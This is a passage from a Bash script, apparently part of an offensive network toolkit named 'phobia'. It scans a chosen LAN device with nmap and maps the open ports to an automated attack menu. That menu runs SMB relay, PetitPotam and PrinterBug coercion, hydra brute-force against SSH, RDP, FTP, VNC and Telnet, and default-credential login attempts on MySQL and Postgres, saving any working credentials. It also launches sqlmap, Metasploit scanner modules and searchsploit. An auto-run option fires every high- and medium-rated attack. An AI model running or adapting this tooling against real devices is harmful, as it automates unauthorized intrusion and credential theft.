    phb_row "  Scanning ports..." "${DIM}${GREY}"
    menu_footer
    echo ""

    echo -e "${CYAN}[*] Port scan (top 1000)...${NC}"
    local ports
    ports=$(nmap -Pn -T4 --top-ports 1000 "$target" 2>/dev/null \
        | awk '/^[0-9]+\/tcp/ && /open/ {gsub("/tcp","",$1); print $1}' | tr '\n' ' ')
    ports="${ports% }"

    if [ -z "$ports" ]; then
        print_banner; menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_div
        phb_row "  NO OPEN PORTS" "${BOLD}${RED}"
        phb_row "  Cannot attack this device." "${BOLD}${RED}"
        phb_div
        phb_row "  [d]  Deep scan (-p-)" "${BOLD}${CYAN}"
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " c
        [ "$c" = "d" ] || [ "$c" = "D" ] && nmap -Pn -T4 -sV -p- "$target"
        addon_wait
        return
    fi

    echo -e "${GREEN}[+] open ports: $ports${NC}"
    echo ""
    echo -e "${CYAN}[*] Building attack plan...${NC}"
    local plan; plan=$(_p6_plan "$target" "$ports")

    if ! _p6_viable "$plan"; then
        print_banner; menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_row "  Ports:  $ports" "${BOLD}${CYAN}"
        phb_div
        phb_row "  NO VIABLE ATTACK PATH" "${BOLD}${RED}"
        phb_div
        phb_row "  [s]  SMB enum only"  "${BOLD}${CYAN}"
        phb_row "  [w]  Web recon only"  "${BOLD}${CYAN}"
        phb_row "  [d]  Deep nmap -sV -p-" "${BOLD}${CYAN}"
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " c
        case "$c" in
            s|S) _p6_smb_enum "$target"; addon_wait ;;
            w|W) _p6_web_recon "$target"; addon_wait ;;
            d|D) nmap -Pn -T4 -sV -p- "$target"; addon_wait ;;
        esac
        return
    fi

    while true; do
        print_banner; menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_row "  Ports:  $ports" "${BOLD}${CYAN}"
        phb_div
        phb_row "  -- available attacks --" "${BOLD}${GREEN}"
        local i=1
        declare -a keys descs
        while IFS='|' read -r port key desc conf; do
            [ -z "$key" ] && continue
            keys[$i]="$key"; descs[$i]="$desc"
            local color="${BOLD}${GREEN}"
            [ "$conf" = "MEDIUM" ] && color="${BOLD}${YELLOW}"
            [ "$conf" = "LOW" ]    && color="${BOLD}${GREY}"
            phb_row "  [$i]  $desc  (port $port, $conf)" "$color"
            i=$((i+1))
        done <<< "$plan"
        phb_div
        phb_row "  [a]  AUTO-RUN ALL HIGH + MEDIUM" "${BOLD}${RED}"
        phb_row "  [n]  New full nmap (-p-)"          "${BOLD}${CYAN}"
        phb_row "  [s]  Save plan to session"          "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back"                          "${RED}"
        menu_footer
        read -p "Choice: " c

        case "$c" in
            0) return ;;
            n|N) nmap -Pn -T4 -sV -p- "$target"; addon_wait ;;
            s|S) local o; o="$(_sess_dir)/scans/attack_${target}_$(date +%s).txt"
                 mkdir -p "$(dirname "$o")"
                 { echo "TARGET: $target"; echo "PORTS: $ports"; echo "DATE: $(date)"; echo ""; echo "$plan"; } > "$o"
                 echo -e "${GREEN}[+] saved: $o${NC}"; addon_wait ;;
            a|A)
                echo -e "${CYAN}[*] AUTO-RUN high + medium attacks...${NC}"
                local sesslog; sesslog="$(_sess_dir)/scans/autorun_${target}_$(date +%s).log"
                mkdir -p "$(dirname "$sesslog")"
                while IFS='|' read -r port key desc conf; do
                    [ -z "$key" ] && continue
                    [ "$conf" = "LOW" ] && continue
                    echo ""
                    echo -e "${BOLD}${MAGENTA}━━━ $desc ━━━${NC}"
                    _p6_run "$target" "$key" 2>&1 | tee -a "$sesslog"
                    sleep 2
                done <<< "$plan"
                echo ""
                echo -e "${GREEN}[+] autolog: $sesslog${NC}"
                addon_wait ;;
            ''|*[!0-9]*) sleep 1 ;;
            *) [ -n "${keys[$c]}" ] && {
                   print_banner; menu_header "R U N N I N G : ${descs[$c]}"; echo ""
                   _p6_run "$target" "${keys[$c]}"
                   echo ""; menu_footer; addon_wait
               } ;;
        esac
    done
}

# ---- msf auto scan + exploit (v6) ----
addon_msf_run() {
    trap phobia_interrupt INT
    print_banner
    menu_header "M S F   A U T O   S C A N   +   E X P L O I T"

    lan_pick_target "MSF TARGET" || return
    local target="$LAN_TARGET_IP"
    echo -e "${GREEN}[+] Target: $target${NC}"
    echo ""

    command -v msfconsole >/dev/null 2>&1 || { echo -e "${RED}[!] msf missing${NC}"; addon_wait; return; }

    echo -e "${CYAN}[*] Ensuring postgres + msfdb...${NC}"
    local db; db=$(_p6_ensure_db)
    echo -e "${GREEN}[+] db: $db${NC}"
    echo ""

    local xml="/tmp/phobia_msf_$(date +%s).xml"
    echo -e "${CYAN}[*] nmap -Pn -sV -O (max 180s)...${NC}"
    timeout 180 sudo nmap -Pn -T4 -sV -O -oX "$xml" "$target" 2>/dev/null | tail -15
    [ ! -f "$xml" ] && { echo -e "${RED}[!] scan failed${NC}"; addon_wait; return; }
    echo ""

    local ports
    ports=$(grep -oE 'portid="[0-9]+"' "$xml" 2>/dev/null | grep -oE '[0-9]+' | sort -nu | tr '\n' ' ')
    echo -e "${GREEN}[+] ports: $ports${NC}"
    echo ""

    local sesslog; sesslog="$(_sess_dir)/scans/msf_${target}_$(date +%s).log"
    mkdir -p "$(dirname "$sesslog")"

    if echo "$db" | grep -qi "connected"; then
        echo -e "${CYAN}[*] importing to msfdb...${NC}"
        msfconsole -q -x "workspace -a phobia_$RANDOM; db_import $xml; services; exit" 2>&1 | tee -a "$sesslog" | tail -20
        echo ""

        echo -e "${CYAN}[*] running msf scanner modules for detected services...${NC}"
        local cmds=""
        for p in $ports; do
            case "$p" in
                21)   cmds+="use auxiliary/scanner/ftp/ftp_version; set RHOSTS $target; run; " ;;
                22)   cmds+="use auxiliary/scanner/ssh/ssh_version; set RHOSTS $target; run; " ;;
                23)   cmds+="use auxiliary/scanner/telnet/telnet_version; set RHOSTS $target; run; " ;;
                25)   cmds+="use auxiliary/scanner/smtp/smtp_version; set RHOSTS $target; run; " ;;
                80)   cmds+="use auxiliary/scanner/http/http_version; set RHOSTS $target; run; use auxiliary/scanner/http/http_header; set RHOSTS $target; run; use auxiliary/scanner/http/robots_txt; set RHOSTS $target; run; " ;;
                110)  cmds+="use auxiliary/scanner/pop3/pop3_version; set RHOSTS $target; run; " ;;
                139|445) cmds+="use auxiliary/scanner/smb/smb_version; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $target; run; " ;;
                1433) cmds+="use auxiliary/scanner/mssql/mssql_ping; set RHOSTS $target; run; " ;;
                3306) cmds+="use auxiliary/scanner/mysql/mysql_version; set RHOSTS $target; run; " ;;
                3389) cmds+="use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS $target; run; " ;;
                5432) cmds+="use auxiliary/scanner/postgres/postgres_version; set RHOSTS $target; run; " ;;
                5900) cmds+="use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; run; " ;;
                6379) cmds+="use auxiliary/scanner/redis/redis_server; set RHOSTS $target; run; " ;;
                8080|8000|443|8888) cmds+="use auxiliary/scanner/http/http_version; set RHOSTS $target; set RPORT $p; run; " ;;
                9200) cmds+="use auxiliary/scanner/elasticsearch/indices_enum; set RHOSTS $target; run; " ;;
                27017) cmds+="use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS $target; run; " ;;
            esac
        done
        cmds+="exit"
        [ -n "$cmds" ] && [ "$cmds" != "exit" ] && printf '%s\n' "$cmds" | sed 's/; /;\n/g' | msfconsole -q 2>&1 | tee -a "$sesslog" | tail -60
        echo ""

        echo -e "${CYAN}[*] searching matching msf exploits...${NC}"
        for p in $ports; do
            case "$p" in
                139|445) echo -e "${YELLOW}[smb]${NC}";  msfconsole -q -x "search smb; exit" 2>&1 | grep -E "^[0-9]+  " | head -10 ;;
                21)      echo -e "${YELLOW}[ftp]${NC}";  msfconsole -q -x "search ftp; exit" 2>&1 | grep -E "^[0-9]+  " | head -8 ;;
                22)      echo -e "${YELLOW}[ssh]${NC}";  msfconsole -q -x "search ssh; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
                80|443|8080|8000) echo -e "${YELLOW}[web]${NC}"; msfconsole -q -x "search http; exit" 2>&1 | grep -E "^[0-9]+  " | head -10 ;;
                3306)    echo -e "${YELLOW}[mysql]${NC}"; msfconsole -q -x "search mysql; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
                3389)    echo -e "${YELLOW}[rdp]${NC}";  msfconsole -q -x "search rdp; exit" 2>&1 | grep -E "^[0-9]+  " | head -5 ;;
            esac
        done
        echo ""
    fi

    echo -e "${CYAN}[*] searchsploit fallback...${NC}"
    for p in $ports; do
        local svc
        svc=$(grep -A2 "portid=\"$p\"" "$xml" 2>/dev/null | grep -oE 'name="[^"]*"' | head -1 | cut -d'"' -f2)
        [ -z "$svc" ] && continue
        echo ""
        echo -e "${BOLD}${CYAN}── port $p ($svc) ──${NC}"
        searchsploit "$svc" 2>/dev/null | grep -vE "^(---|Shellcodes)" | head -6
    done
    echo ""

    # recommend next attack
    echo -e "${BOLD}${MAGENTA}═══ RECOMMENDED NEXT STEP ═══${NC}"
    if echo "$ports" | grep -qE '\b445\b|\b139\b'; then
        echo -e "${GREEN}[!] SMB open → use 'attack a device' for relay chain${NC}"
    elif echo "$ports" | grep -qE '\b80\b|\b443\b|\b8080\b'; then
        echo -e "${GREEN}[!] Web open → use 'attack a device' for web attacks${NC}"
    else
        echo -e "${YELLOW}[!] no high-value ports${NC}"
    fi
    echo ""

    echo -e "${GREEN}[+] log: $sesslog${NC}"
    addon_wait
}


# ===============================================================
# AUTO-ATTACK MODULE v1
# Runs against a target. Reads open ports. Picks attacks.
# Refuses if nothing viable.
# ===============================================================

# ---- auto-start msfdb if not running ----
_msf_ensure_db() {
    if ! pgrep -x postgres >/dev/null 2>&1; then
        echo -e "${CYAN}[*] Starting postgresql...${NC}"
        sudo systemctl start postgresql 2>/dev/null
        sleep 3
    fi
    if ! sudo msfdb status 2>/dev/null | grep -qi "connected\|running"; then
        echo -e "${CYAN}[*] Initializing msfdb (first time only)...${NC}"
        sudo msfdb init 2>&1 | tee -a "$PHOBIA_DEBUG_LOG" | tail -3
        sleep 2
    fi
    # final check
    local status
    status=$(msfconsole -q -x "db_status; exit" 2>&1 | grep -iE "connected|postgresql")
    if echo "$status" | grep -qi "connected"; then
        echo -e "${GREEN}[+] msfdb connected${NC}"
        return 0
    fi
    echo -e "${YELLOW}[!] msfdb not connected — will use nmap+searchsploit fallback${NC}"
    return 1
}

# ---- port → attack mapping ----
_auto_attack_plan() {
    local target="$1"
    local ports="$2"
    local plan=()

    # ---------- SMB ----------
    if echo "$ports" | grep -qE '\b445\b|\b139\b'; then
        local signing
        signing=$(nmap -p 445 --script smb2-security-mode "$target" 2>/dev/null | grep -i "signing")
        if echo "$signing" | grep -qi "but not required"; then
            plan+=("445|smb_relay|SMB Relay (signing off)|HIGH")
        fi
        if command -v impacket-rpcdump >/dev/null 2>&1; then
            local rpcs
            rpcs=$(timeout 15 impacket-rpcdump "$target" 2>/dev/null)
            echo "$rpcs" | grep -qi "MS-EFSRPC" && plan+=("445|petitpotam|PetitPotam + relay|HIGH")
            echo "$rpcs" | grep -qi "MS-RPRN\|spoolss" && plan+=("445|printerbug|PrinterBug + relay|HIGH")
            echo "$rpcs" | grep -qi "MS-PAR" && plan+=("445|printnightmare|PrintNightmare check|MEDIUM")
        fi
        plan+=("445|smb_enum|SMB enumeration|LOW")
        nmap -p 445 --script smb-vuln-ms17-010 "$target" 2>/dev/null | grep -qi "VULNERABLE" && \
            plan+=("445|eternalblue|MS17-010 EternalBlue|HIGH")
    fi

    # ---------- SSH ----------
    echo "$ports" | grep -qE '\b22\b' && {
        plan+=("22|ssh_brute|SSH brute|LOW")
        plan+=("22|ssh_enum|SSH banner grab|LOW")
    }

    # ---------- Web ----------
    echo "$ports" | grep -qE '\b80\b|\b8080\b|\b8000\b' && {
        plan+=("80|web_recon|Web recon|HIGH")
        plan+=("80|web_nuclei|Nuclei CVE scan|MEDIUM")
        plan+=("80|web_nikto|Nikto scan|MEDIUM")
        plan+=("80|web_sqli|SQLi probe|MEDIUM")
        plan+=("80|web_xss|XSS probe|MEDIUM")
        plan+=("80|web_fuzz|Dir fuzz|MEDIUM")
    }

    # ---------- RDP ----------
    echo "$ports" | grep -qE '\b3389\b' && {
        plan+=("3389|rdp_brute|RDP brute|LOW")
        plan+=("3389|rdp_bluekeep|BlueKeep check|LOW")
    }

    # ---------- FTP ----------
    echo "$ports" | grep -qE '\b21\b' && {
        plan+=("21|ftp_anon|FTP anon check|HIGH")
        plan+=("21|ftp_brute|FTP brute|LOW")
    }

    # ---------- DBs ----------
    echo "$ports" | grep -qE '\b3306\b' && {
        plan+=("3306|mysql_unauth|MySQL unauth check|HIGH")
    }
    echo "$ports" | grep -qE '\b5432\b' && {
        plan+=("5432|pg_unauth|Postgres unauth check|HIGH")
    }
    echo "$ports" | grep -qE '\b6379\b' && {
        plan+=("6379|redis_unauth|Redis unauth check|HIGH")
    }
    echo "$ports" | grep -qE '\b27017\b' && {
        plan+=("27017|mongo_unauth|MongoDB unauth check|HIGH")
    }

    # ---------- WinRM ----------
    echo "$ports" | grep -qE '\b5985\b|\b5986\b' && {
        plan+=("5985|winrm_brute|WinRM brute|MEDIUM")
    }

    # ---------- VNC / Telnet ----------
    echo "$ports" | grep -qE '\b5900\b' && {
        plan+=("5900|vnc_brute|VNC brute|LOW")
    }
    echo "$ports" | grep -qE '\b23\b' && {
        plan+=("23|telnet_brute|Telnet brute|LOW")
    }

    # ---------- Docker API ----------
    echo "$ports" | grep -qE '\b2375\b|\b2376\b' && {
        plan+=("2375|docker_api|Docker API unauth|HIGH")
    }

    # ---------- Elasticsearch ----------
    echo "$ports" | grep -qE '\b9200\b' && {
        plan+=("9200|elastic_unauth|Elasticsearch unauth|HIGH")
    }

    printf '%s\n' "${plan[@]}"
}

_auto_attack_viable() {
    echo "$1" | grep -qE '\|(HIGH|MEDIUM)$' && return 0 || return 1
}

# ---- individual attacks ----
_auto_smb_enum() {
    local t="$1"
    echo -e "${CYAN}[*] SMB enumeration${NC}"
    echo "── shares ──"; smbclient -L "//$t" -N 2>&1 | head -30
    echo "── users ──";  rpcclient -U "" -N "$t" -c "enumdomusers;getdompwinfo" 2>&1 | head -20
}

_auto_petitpotam() {
    local t="$1"; local myip; myip=$(_relay_get_my_ip "$(_relay_get_iface)")
    echo -e "${CYAN}[*] PetitPotam → $t → $myip${NC}"
    impacket-petitpotam "$t" "$myip" 2>&1 | tail -10
}

_auto_printerbug() {
    local t="$1"; local myip; myip=$(_relay_get_my_ip "$(_relay_get_iface)")
    echo -e "${CYAN}[*] PrinterBug → $t → $myip${NC}"
    impacket-printerbug "$t" "$myip" 2>&1 | tail -10
}

_auto_printnightmare_check() {
    local t="$1"
    echo -e "${CYAN}[*] PrintNightmare check${NC}"
    nmap -p 445 --script smb-vuln-printnightmare "$t" 2>&1 | grep -iE "vuln|printnightmare"
}

_auto_eternalblue() {
    local t="$1"
    nmap -p 445 --script smb-vuln-ms17-010 "$t" 2>&1 | grep -iE "VULNERABLE|not vulnerable"
}

_auto_ssh_enum() {
    timeout 3 nc -nv "$1" 22 2>&1 | head -3
}

_auto_ssh_brute() {
    local t="$1"
    read -p "  username: " u
    read -p "  wordlist [/usr/share/wordlists/rockyou.txt]: " w
    w="${w:-/usr/share/wordlists/rockyou.txt}"
    [ -f "$w" ] && hydra -l "$u" -P "$w" -t 4 "ssh://$t" 2>&1 | tail -20
}

_auto_web_recon() {
    local t="$1"
    echo "── headers ──"; curl -sI --max-time 5 "http://$t/" 2>/dev/null | head -15
    echo "── title ──";   curl -s --max-time 5 "http://$t/" 2>/dev/null | grep -oiE "<title>[^<]*</title>" | head -3
    echo "── robots ──";  curl -s --max-time 5 "http://$t/robots.txt" 2>/dev/null | head -10
    command -v whatweb >/dev/null 2>&1 && whatweb -a 1 "http://$t/" 2>/dev/null | head -3
}

_auto_web_nuclei() {
    command -v nuclei >/dev/null 2>&1 && \
    nuclei -u "http://$1/" -silent -severity critical,high,medium 2>&1 | head -30
}

_auto_web_nikto() {
    command -v nikto >/dev/null 2>&1 && \
    nikto -h "http://$1/" 2>&1 | head -40
}

_auto_web_sqli() {
    local t="$1"
    read -p "  URL with params: " u
    [ -z "$u" ] && return
    local b i
    b=$(curl -s -o /dev/null -w "%{size_download}" "$u" 2>/dev/null)
    i=$(curl -s -o /dev/null -w "%{size_download}" "${u}'" 2>/dev/null)
    echo "  baseline: $b  with ': $i"
    [ "$b" != "$i" ] && echo -e "${RED}[!] possible SQLi${NC}" && \
        read -p "  run sqlmap? [y/N]: " r && [ "$r" = "y" ] && \
        sqlmap -u "$u" --batch --level=2 --risk=2 2>&1 | tail -40
}

_auto_web_xss() {
    local t="$1"
    read -p "  URL with params: " u
    [ -z "$u" ] && return
    local p; p=$(echo "$u" | grep -oE '[?&][^=&]+=' | head -1 | tr -d '?&=')
    [ -z "$p" ] && return
    local enc='%3Cscript%3Ealert(1)%3C%2Fscript%3E'
    local test_url; test_url=$(echo "$u" | sed "s|$p=[^&]*|$p=$enc|")
    curl -s "$test_url" 2>/dev/null | grep -qF '<script>alert(1)</script>' && \
        echo -e "${RED}[!] XSS likely — $test_url${NC}" || echo "[+] not reflected"
}

_auto_web_fuzz() {
    command -v ffuf >/dev/null 2>&1 && \
    ffuf -u "http://$1/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40 -s 2>&1 | head -30
}

_auto_rdp_bluekeep() {
    nmap -p 3389 --script rdp-vuln-ms12-020 "$1" 2>&1 | grep -iE "vuln|VULNERABLE"
}

_auto_rdp_brute() {
    local t="$1"
    read -p "  username: " u
    read -p "  wordlist: " w
    w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -l "$u" -P "$w" -t 1 "rdp://$t" 2>&1 | tail -20
}

_auto_ftp_anon() {
    timeout 5 bash -c "echo -e 'USER anonymous\nPASS test@test.com\nQUIT' | nc $1 21" 2>&1 | head -10
}

_auto_ftp_brute() {
    local t="$1"
    read -p "  username: " u; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -l "$u" -P "$w" -t 4 "ftp://$t" 2>&1 | tail -20
}

_auto_mysql_unauth() {
    local t="$1"
    for c in "root:" "root:root" "root:toor" "root:password"; do
        u="${c%%:*}"; p="${c##*:}"
        if timeout 3 mysql -h "$t" -u "$u" ${p:+-p$p} -e "SELECT 1;" 2>/dev/null | grep -q 1; then
            echo -e "${RED}[!] WORKS: $u:$p${NC}"
            _vault_add "mysql" "$t" "$u" "$p" "" 2>/dev/null
            return
        fi
    done
    echo "[+] no common creds worked"
}

_auto_pg_unauth() {
    local t="$1"
    for p in "" "postgres" "password"; do
        if PGPASSWORD="$p" timeout 3 psql -h "$t" -U postgres -c "SELECT 1;" 2>/dev/null | grep -q 1; then
            echo -e "${RED}[!] WORKS: postgres:$p${NC}"; return
        fi
    done
    echo "[+] no common creds worked"
}

_auto_redis_unauth() {
    local t="$1"
    local info; info=$(redis-cli -h "$t" INFO 2>&1 | head -5)
    echo "$info" | grep -qi "redis_version" && echo -e "${RED}[!] UNAUTH Redis!${NC}" && echo "$info" || echo "[+] password or closed"
}

_auto_mongo_unauth() {
    timeout 5 bash -c "echo 'db.adminCommand({listDatabases:1})' | nc $1 27017" 2>&1 | head -10
}

_auto_winrm_brute() {
    local t="$1"; local cme
    command -v nxc >/dev/null 2>&1 && cme=nxc || cme=crackmapexec
    read -p "  username: " u; read -s -p "  password: " p; echo ""
    $cme winrm "$t" -u "$u" -p "$p" 2>&1 | tail -10
}

_auto_vnc_brute() {
    local t="$1"; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -P "$w" -t 1 "vnc://$t" 2>&1 | tail -15
}

_auto_telnet_brute() {
    local t="$1"; read -p "  username: " u; read -p "  wordlist: " w; w="${w:-/usr/share/wordlists/rockyou.txt}"
    hydra -l "$u" -P "$w" -t 4 "telnet://$t" 2>&1 | tail -15
}

_auto_docker_api() {
    local resp; resp=$(curl -s --max-time 5 "http://$1:2375/version" 2>/dev/null)
    echo "$resp" | grep -q "ApiVersion\|Version" && \
        echo -e "${RED}[!] UNAUTH Docker API!${NC}" && echo "$resp" | head -10 || echo "[+] not vulnerable"
}

_auto_elastic_unauth() {
    local resp; resp=$(curl -s --max-time 5 "http://$1:9200/" 2>/dev/null)
    echo "$resp" | grep -qi "cluster_name\|version" && \
        echo -e "${RED}[!] UNAUTH Elasticsearch!${NC}" && echo "$resp" | head -10 || echo "[+] not vulnerable"
}

# ---- dispatcher ----
_auto_attack_run() {
    local t="$1" key="$2"
    case "$key" in
        smb_relay)       _relay_launch "$t" "$(_relay_get_iface)" 2>/dev/null ;;
        petitpotam)      _auto_petitpotam "$t" ;;
        printerbug)      _auto_printerbug "$t" ;;
        printnightmare)  _auto_printnightmare_check "$t" ;;
        smb_enum)        _auto_smb_enum "$t" ;;
        eternalblue)     _auto_eternalblue "$t" ;;
        ssh_enum)        _auto_ssh_enum "$t" ;;
        ssh_brute)       _auto_ssh_brute "$t" ;;
        web_recon)       _auto_web_recon "$t" ;;
        web_nuclei)      _auto_web_nuclei "$t" ;;
        web_nikto)       _auto_web_nikto "$t" ;;
        web_sqli)        _auto_web_sqli "$t" ;;
        web_xss)         _auto_web_xss "$t" ;;
        web_fuzz)        _auto_web_fuzz "$t" ;;
        rdp_bluekeep)    _auto_rdp_bluekeep "$t" ;;
        rdp_brute)       _auto_rdp_brute "$t" ;;
        ftp_anon)        _auto_ftp_anon "$t" ;;
        ftp_brute)       _auto_ftp_brute "$t" ;;
        mysql_unauth)    _auto_mysql_unauth "$t" ;;
        pg_unauth)       _auto_pg_unauth "$t" ;;
        redis_unauth)    _auto_redis_unauth "$t" ;;
        mongo_unauth)    _auto_mongo_unauth "$t" ;;
        winrm_brute)     _auto_winrm_brute "$t" ;;
        vnc_brute)       _auto_vnc_brute "$t" ;;
        telnet_brute)    _auto_telnet_brute "$t" ;;
        docker_api)      _auto_docker_api "$t" ;;
        elastic_unauth)  _auto_elastic_unauth "$t" ;;
        *) echo -e "${RED}[!] unknown: $key${NC}" ;;
    esac
}

# ---- the attack menu ----
_auto_attack_device() {
    trap phobia_interrupt INT
    if ! lan_pick_target "TARGET"; then return; fi
    local target="$LAN_TARGET_IP"

    print_banner
    menu_header "A T T A C K   A   D E V I C E"
    phb_row "  Target: $target" "${BOLD}${YELLOW}"
    phb_row "  Scanning ports..." "${DIM}${GREY}"
    menu_footer
    echo ""

    echo -e "${CYAN}[*] Port scan (top 1000)...${NC}"
    local ports
    ports=$(nmap -Pn -T4 --top-ports 1000 "$target" 2>/dev/null \
        | awk '/^[0-9]+\/tcp/ && /open/ {gsub("/tcp","",$1); print $1}' | tr '\n' ' ')
    ports="${ports% }"

    if [ -z "$ports" ]; then
        print_banner
        menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_div
        phb_row "  NO OPEN PORTS" "${BOLD}${RED}"
        phb_row "  Cannot attack this device." "${BOLD}${RED}"
        phb_div
        phb_row "  [d]  Deep scan (-p- full)"  "${BOLD}${CYAN}"
        phb_row "  [0]  Back"                    "${RED}"
        menu_footer
        read -p "Choice: " ch
        [ "$ch" = "d" ] || [ "$ch" = "D" ] && nmap -Pn -T4 -sV -p- "$target"
        addon_wait
        return
    fi

    echo -e "${GREEN}[+] open ports: $ports${NC}"
    echo ""
    echo -e "${CYAN}[*] Building attack plan...${NC}"
    local plan
    plan=$(_auto_attack_plan "$target" "$ports")

    if ! _auto_attack_viable "$plan"; then
        print_banner
        menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_row "  Ports:  $ports" "${BOLD}${CYAN}"
        phb_div
        phb_row "  NO VIABLE ATTACK PATH" "${BOLD}${RED}"
        phb_row "  Ports open but no matching attack." "${DIM}${GREY}"
        phb_div
        phb_row "  -- manual options --" "${BOLD}${CYAN}"
        phb_row "  [s]  SMB enum only"          "${BOLD}${CYAN}"
        phb_row "  [w]  Web recon only"         "${BOLD}${CYAN}"
        phb_row "  [d]  Deep nmap scan"         "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back"                    "${RED}"
        menu_footer
        read -p "Choice: " ch
        case "$ch" in
            s|S) _auto_smb_enum "$target"; addon_wait ;;
            w|W) _auto_web_recon "$target"; addon_wait ;;
            d|D) nmap -Pn -T4 -sV -p- "$target"; addon_wait ;;
        esac
        return
    fi

    while true; do
        print_banner
        menu_header "A T T A C K   A   D E V I C E"
        phb_row "  Target: $target" "${BOLD}${YELLOW}"
        phb_row "  Ports:  $ports" "${BOLD}${CYAN}"
        phb_div
        phb_row "  -- available attacks --" "${BOLD}${GREEN}"
        local i=1
        declare -a keys descs
        while IFS='|' read -r port key desc conf; do
            [ -z "$key" ] && continue
            keys[$i]="$key"; descs[$i]="$desc"
            local color="${BOLD}${GREEN}"
            [ "$conf" = "MEDIUM" ] && color="${BOLD}${YELLOW}"
            [ "$conf" = "LOW" ]    && color="${BOLD}${GREY}"
            phb_row "  [$i]  $desc  (port $port, $conf)" "$color"
            i=$((i+1))
        done <<< "$plan"
        phb_div
        phb_row "  [n]  New full nmap scan (-p-)"   "${BOLD}${CYAN}"
        phb_row "  [s]  Save plan to session"        "${BOLD}${CYAN}"
        phb_row "  [a]  Run ALL (auto top-down)"     "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                        "${RED}"
        menu_footer
        read -p "Choice: " ch

        case "$ch" in
            0) return ;;
            n|N) nmap -Pn -T4 -sV -p- "$target"; addon_wait ;;
            s|S)
                local out="$(_sess_dir)/scans/attack_plan_${target}_$(date +%s).txt"
                mkdir -p "$(dirname "$out")"
                { echo "TARGET: $target"; echo "PORTS: $ports"; echo "DATE: $(date)"; echo ""; echo "$plan"; } > "$out"
                echo -e "${GREEN}[+] saved: $out${NC}"; addon_wait ;;
            a|A)
                echo -e "${CYAN}[*] Running all high+medium attacks...${NC}"
                while IFS='|' read -r port key desc conf; do
                    [ -z "$key" ] && continue
                    [ "$conf" = "LOW" ] && continue
                    echo ""
                    echo -e "${BOLD}${MAGENTA}━━━ $desc ━━━${NC}"
                    _auto_attack_run "$target" "$key"
                    sleep 2
                done <<< "$plan"
                addon_wait ;;
            ''|*[!0-9]*) sleep 1 ;;
            *) [ -n "${keys[$ch]}" ] && {
                   print_banner; menu_header "R U N N I N G : ${descs[$ch]}"; echo ""
                   _auto_attack_run "$target" "${keys[$ch]}"
                   echo ""; menu_footer; addon_wait
               } ;;
        esac
    done
}

# ===============================================================
# MSF AUTO SCAN + EXPLOIT (replaces choice 16)
# ===============================================================
msf_auto_exploit() {
    trap phobia_interrupt INT
    print_banner
    menu_header "M S F   A U T O   S C A N   +   E X P L O I T"

    # 1. pick target
    if ! lan_pick_target "MSF TARGET"; then return; fi
    local target="$LAN_TARGET_IP"

    echo ""
    echo -e "${CYAN}[*] Target: $target${NC}"
    echo ""

    # 2. start msfdb
    local db_ok=0
    _msf_ensure_db && db_ok=1

    # 3. nmap scan
    local xml="/tmp/phobia_msf_$(date +%s).xml"
    echo -e "${CYAN}[*] nmap -sV -O scan...${NC}"
    if ! timeout 180 sudo nmap -Pn -T4 -sV -O -oX "$xml" "$target" 2>&1 | tee /tmp/phobia_msf_scan.log | tail -10; then
        echo -e "${RED}[!] nmap failed${NC}"
    fi

    # 4. parse open ports
    local ports
    ports=$(grep -oE 'portid="[0-9]+"' "$xml" 2>/dev/null | grep -oE '[0-9]+' | sort -nu | tr '\n' ' ')
    echo ""
    echo -e "${GREEN}[+] open ports: $ports${NC}"
    echo ""

    # 5. if msfdb ok → import + autopwn
    if [ "$db_ok" = "1" ]; then
        echo -e "${CYAN}[*] importing to msfdb...${NC}"
        msfconsole -q -x "workspace -a phobia_$(date +%s); db_import $xml; hosts; services; exit" 2>&1 | tail -30
        echo ""

        echo -e "${CYAN}[*] running msf module matches...${NC}"
        echo -e "${DIM}    matching open ports against msf modules${NC}"
        echo ""

        # use auxiliary/scanner modules + matching exploits
        local msf_cmds=""
        msf_cmds+="db_services; "

        # per-port module firing
        for p in $ports; do
            case "$p" in
                21)  msf_cmds+="use auxiliary/scanner/ftp/ftp_version; set RHOSTS $target; run; " ;;
                22)  msf_cmds+="use auxiliary/scanner/ssh/ssh_version; set RHOSTS $target; run; " ;;
                23)  msf_cmds+="use auxiliary/scanner/telnet/telnet_version; set RHOSTS $target; run; " ;;
                25)  msf_cmds+="use auxiliary/scanner/smtp/smtp_version; set RHOSTS $target; run; " ;;
                80)  msf_cmds+="use auxiliary/scanner/http/http_version; set RHOSTS $target; run; use auxiliary/scanner/http/robots_txt; set RHOSTS $target; run; " ;;
                110) msf_cmds+="use auxiliary/scanner/pop3/pop3_version; set RHOSTS $target; run; " ;;
                139|445) msf_cmds+="use auxiliary/scanner/smb/smb_version; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $target; run; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $target; run; " ;;
